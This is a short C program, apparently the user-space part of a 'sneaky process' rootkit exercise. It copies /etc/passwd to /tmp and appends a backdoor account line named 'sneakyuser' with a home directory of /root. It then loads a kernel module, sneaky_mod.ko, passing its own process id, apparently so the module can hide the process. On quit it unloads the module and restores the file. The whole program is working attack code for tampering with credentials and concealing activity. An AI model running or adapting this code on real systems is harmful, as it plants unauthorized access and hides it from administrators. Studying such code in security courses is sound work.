#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

int main() {
    pid_t pid;
    int status;

    printf("sneaky_process pid = %d\n", getpid());

    system("cp /etc/passwd /tmp/passwd");
    FILE *fp = fopen("/etc/passwd", "a");
    if (fp == NULL) {
        perror("Failed to open /etc/passwd");
        exit(1);
    }
    fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
    fclose(fp);


    char command[256];
    sprintf(command, "insmod sneaky_mod.ko pid=%d", getpid());
    system(command);

   printf("Enter 'q' to quit:\n");
    char c;
    while (scanf("%c", &c) == 1 && c != 'q') {
    }

    system("rmmod sneaky_mod");

    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd");

    return 0;
}
